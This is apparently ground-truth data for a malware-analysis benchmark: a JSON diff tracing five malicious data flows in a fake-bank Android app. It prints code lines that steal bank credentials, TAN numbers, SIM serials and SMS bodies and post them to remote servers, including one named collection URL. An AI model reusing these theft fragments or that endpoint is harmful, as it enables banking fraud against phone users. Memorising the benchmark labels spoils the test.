@@ -1,0 +1,464 @@
+{
+  "fileName": "fakebank_android_samp.apk",
+  "day": "2019-03-20",
+  "findings": [
+    {
+      "source": {
+        "statement": "this.ed1 = (EditText) findViewById(R.id.bankid_editText1);",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "com.example.bankmanager.BankActivity",
+        "lineNo": 24,
+        "targetName": "findViewById",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r0.<com.example.bankmanager.BankActivity: android.view.View findViewById(int)>(2131230736)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "is = httpClient.execute(httpPost).getEntity().getContent();",
+        "methodName": "public JSONObject makeHttpRequest(String url, String method, List<NameValuePair> params)",
+        "className": "cn.smsmanager.tools.JSONParser",
+        "lineNo": 52,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r8.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "public void onClick(View arg0) {",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "com.example.bankmanager.BankActivity",
+          "lineNo": 32,
+          "ID": 1
+        },
+        {
+          "statement": "String str1 = BankActivity.this.ed1.getText().toString();",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankActivity.AnonymousClass1",
+          "lineNo": 33,
+          "ID": 2
+        },
+        {
+          "statement": "if (str1 != null && str2 != null) {",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankActivity.AnonymousClass1",
+          "lineNo": 35,
+          "ID": 3
+        },
+        {
+          "statement": "if (str1.equals(\"\") || str2.equals(\"\")) {",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankActivity.AnonymousClass1",
+          "lineNo": 36,
+          "ID": 4
+        },
+        {
+          "statement": "} else if (str2.length() == 13) {",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankActivity.AnonymousClass1",
+          "lineNo": 37,
+          "ID": 5
+        },
+        {
+          "statement": "BankInfo.bankinid = str1;",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankActivity.AnonymousClass1",
+          "lineNo": 38,
+          "ID": 6
+        },
+        {
+          "statement": "intent.setClass(BankActivity.this.getApplicationContext(), BankNumActivity.class);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankActivity.AnonymousClass1",
+          "lineNo": 41,
+          "ID": 7
+        },
+        {
+          "statement": "BankActivity.this.startActivity(intent);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankActivity.AnonymousClass1",
+          "lineNo": 42,
+          "ID": 8
+        },
+        {
+          "statement": "public void onClick(View arg0) {",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "com.example.bankmanager.BankNumActivity",
+          "lineNo": 32,
+          "ID": 9
+        },
+        {
+          "statement": "if (str1 != null && str2 != null) {",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankNumActivity.AnonymousClass1",
+          "lineNo": 35,
+          "ID": 10
+        },
+        {
+          "statement": "} else if (str2.length() == 4) {",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankNumActivity.AnonymousClass1",
+          "lineNo": 37,
+          "ID": 11
+        },
+        {
+          "statement": "intent.setClass(BankNumActivity.this.getApplicationContext(), BankScardActivity.class);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankNumActivity.AnonymousClass1",
+          "lineNo": 41,
+          "ID": 12
+        },
+        {
+          "statement": "BankNumActivity.this.startActivity(intent);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankNumActivity.AnonymousClass1",
+          "lineNo": 42,
+          "ID": 13
+        },
+        {
+          "statement": "public void onClick(View arg0) {",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "com.example.bankmanager.BankScardActivity",
+          "lineNo": 35,
+          "ID": 14
+        },
+        {
+          "statement": "if (i == 35) {",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankScardActivity.AnonymousClass1",
+          "lineNo": 74,
+          "ID": 15
+        },
+        {
+          "statement": "intent.setClass(BankScardActivity.this.getApplicationContext(), BankEndActivity.class);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankScardActivity.AnonymousClass1",
+          "lineNo": 76,
+          "ID": 16
+        },
+        {
+          "statement": "BankScardActivity.this.startActivity(intent);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.example.bankmanager.BankScardActivity.AnonymousClass1",
+          "lineNo": 77,
+          "ID": 17
+        },
+        {
+          "statement": "BankEndActivity.this.params.add(new BasicNameValuePair(\"bankinid\", BankInfo.bankinid));",
+          "methodName": "public String doInBackground(String... args)",
+          "className": "com.example.bankmanager.BankEndActivity.CreateNewUser",
+          "lineNo": 164,
+          "ID": 18
+        },
+        {
+          "statement": "JSONObject json = BankEndActivity.this.jsonParser.makeHttpRequest(BankEndActivity.this.send_bank_url, \"POST\", BankEndActivity.this.params);",
+          "methodName": "public String doInBackground(String... args)",
+          "className": "com.example.bankmanager.BankEndActivity.CreateNewUser",
+          "lineNo": 209,
+          "ID": 19
+        },
+        {
+          "statement": "if (method == \"POST\") {",
+          "methodName": "public JSONObject makeHttpRequest(String url, String method, List<NameValuePair> params)",
+          "className": "cn.smsmanager.tools.JSONParser",
+          "lineNo": 45,
+          "ID": 20
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(params, \"EUC-KR\"));",
+          "methodName": "public JSONObject makeHttpRequest(String url, String method, List<NameValuePair> params)",
+          "className": "cn.smsmanager.tools.JSONParser",
+          "lineNo": 50,
+          "ID": 21
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "staticField": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious ICC flow crosses 4 different activities: BankActivity, BankNumActivity BankScardActivity and BankEndActivity. It starts from reading bank account number from user input in BankActivity; when the user performs a click on a button, the BankNumActivity is started; the BankScardActivity and BankEndActivity are also started by clicking on a button. In the first three activities, bank information such as account number, passwords and TAN number are stored into the static fields of the class BankInfo. There are input validations for user inputs to make sure that only valid bank information is collected. In the last activity, all collected information will be read from BankInfo and written to a List. This list will be sent to a remote server per an HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String sim_no = ((TelephonyManager) context.getSystemService(\"phone\")).getSimSerialNumber();",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.smsmanager.BootCompleteBroadcastReceiver",
+        "lineNo": 36,
+        "targetName": "getSimSerialNumber",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r6.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.d(\"Httpequest getStream string\", conn.getInputStream().toString());",
+        "methodName": "public static byte[] sendGetRequest(String path, Map<String, String> params, String enc)",
+        "className": "cn.smsmanager.internet.HttpRequest",
+        "lineNo": 99,
+        "targetName": "getInputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r8.<java.net.HttpURLConnection: java.io.InputStream getInputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "params.put(\"sim_no\", sim_no);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.smsmanager.BootCompleteBroadcastReceiver",
+          "lineNo": 41,
+          "ID": 1
+        },
+        {
+          "statement": "HttpRequest.sendGetRequest(\"http://www.shm2580.com/post_simno.asp\", params, \"UTF-8\");",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.smsmanager.BootCompleteBroadcastReceiver",
+          "lineNo": 44,
+          "ID": 2
+        },
+        {
+          "statement": "for (Entry<String, String> entry : params.entrySet()) {",
+          "methodName": "public static byte[] sendGetRequest(String path, Map<String, String> params, String enc)",
+          "className": "cn.smsmanager.internet.HttpRequest",
+          "lineNo": -1,
+          "ID": 3
+        },
+        {
+          "statement": "sb.append((String) entry.getKey()).append('=').append(URLEncoder.encode((String) entry.getValue(), enc)).append('&');",
+          "methodName": "public static byte[] sendGetRequest(String path, Map<String, String> params, String enc)",
+          "className": "cn.smsmanager.internet.HttpRequest",
+          "lineNo": 102,
+          "ID": 4
+        },
+        {
+          "statement": "URL url = new URL(sb.toString());",
+          "methodName": "public static byte[] sendGetRequest(String path, Map<String, String> params, String enc)",
+          "className": "cn.smsmanager.internet.HttpRequest",
+          "lineNo": 78,
+          "ID": 5
+        },
+        {
+          "statement": "HttpURLConnection conn = (HttpURLConnection) url.openConnection();",
+          "methodName": "public static byte[] sendGetRequest(String path, Map<String, String> params, String enc)",
+          "className": "cn.smsmanager.internet.HttpRequest",
+          "lineNo": 80,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "collections": true,
+        "lifecycle": true
+      },
+      "ID": 2,
+      "description": "This malicious flow starts by reading the serial number of the SIM card, then writes to the field of the class BankEndActivity, thento a HashMap. Then information in the HashMap will be appended to a String which will be sent to a remote server per an HTTP GET request. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "BankEndActivity.this.phoneNumber = tel.getSimSerialNumber();",
+        "methodName": "public String doInBackground(String... args)",
+        "className": "com.example.bankmanager.BankEndActivity.CreateNewUser",
+        "lineNo": 244,
+        "targetName": "getSimSerialNumber",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r10.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "is = httpClient.execute(httpPost).getEntity().getContent();",
+        "methodName": "public JSONObject makeHttpRequest(String url, String method, List<NameValuePair> params)",
+        "className": "cn.smsmanager.tools.JSONParser",
+        "lineNo": 78,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r8.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "BankEndActivity.this.params.add(new BasicNameValuePair(\"phone\", BankEndActivity.this.phoneNumber));",
+          "methodName": "public String doInBackground(String... args)",
+          "className": "com.example.bankmanager.BankEndActivity.CreateNewUser",
+          "lineNo": 163,
+          "ID": 1
+        },
+        {
+          "statement": "JSONObject json = BankEndActivity.this.jsonParser.makeHttpRequest(BankEndActivity.this.send_bank_url, \"POST\", BankEndActivity.this.params);",
+          "methodName": "public String doInBackground(String... args)",
+          "className": "com.example.bankmanager.BankEndActivity.CreateNewUser",
+          "lineNo": 209,
+          "ID": 2
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(params, \"EUC-KR\"));",
+          "methodName": "public JSONObject makeHttpRequest(String url, String method, List<NameValuePair> params)",
+          "className": "cn.smsmanager.tools.JSONParser",
+          "lineNo": 50,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious flow starts by reading the serial number of the SIM card, then writes to a List. This list will be sent to a remote server per an HTTP POST request. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "this.params2.add(new BasicNameValuePair(\"bady\", smsMessage.getDisplayMessageBody()));",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.smsmanager.smsReceiver",
+        "lineNo": 77,
+        "targetName": "getDisplayMessageBody",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r12.<android.telephony.SmsMessage: java.lang.String getDisplayMessageBody()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.d(\"response=httpclient.execute(httppost);\", httpclient.execute(httppost).toString());",
+        "methodName": "public void run()",
+        "className": "com.example.smsmanager.smsReceiver.AnonymousClass1",
+        "lineNo": 106,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = interfaceinvoke $r1.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new Thread() {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.smsmanager.smsReceiver",
+          "lineNo": 116,
+          "ID": 1
+        },
+        {
+          "statement": "public void run() {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.smsmanager.smsReceiver",
+          "lineNo": 84,
+          "ID": 2
+        },
+        {
+          "statement": "httppost.setEntity(new UrlEncodedFormEntity(smsReceiver.this.params2, \"EUC-KR\"));",
+          "methodName": "public void run()",
+          "className": "com.example.smsmanager.smsReceiver.AnonymousClass1",
+          "lineNo": 93,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 4,
+      "description": "This malicious flow starts by reading SMS message, then writes to a BasicNameValuePair object, then a HashMap. The hashmap will be sent to a rmote server per an HTTP POST request when a Thread created by the class smsReceiver runs.  ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "file = new File(\"/sdcard/apk/hannanbank.apk\");",
+        "methodName": "private void removeApplications()",
+        "className": "com.example.service.InstallService",
+        "lineNo": 100,
+        "targetName": "File",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r12.<java.io.File: void <init>(java.lang.String)>(\"/sdcard/apk/hannanbank.apk\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "startActivity(intent);",
+        "methodName": "private void installApk(String filename)",
+        "className": "com.example.service.InstallService",
+        "lineNo": 68,
+        "targetName": "startActivity",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r0.<com.example.service.InstallService: void startActivity(android.content.Intent)>($r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (file.exists()) {",
+          "methodName": "private void removeApplications()",
+          "className": "com.example.service.InstallService",
+          "lineNo": 101,
+          "ID": 1
+        },
+        {
+          "statement": "installApk(file.getAbsolutePath());",
+          "methodName": "private void removeApplications()",
+          "className": "com.example.service.InstallService",
+          "lineNo": 102,
+          "ID": 2
+        },
+        {
+          "statement": "intent.setDataAndType(Uri.fromFile(new File(filename)), \"application/vnd.android.package-archive\");",
+          "methodName": "private void installApk(String filename)",
+          "className": "com.example.service.InstallService",
+          "lineNo": 67,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "pathConstraints": true
+      },
+      "ID": 5,
+      "description": "This malicous flow installs an apk from sdcard. ",
+      "isNegative": false
+    }
+  ]
+}
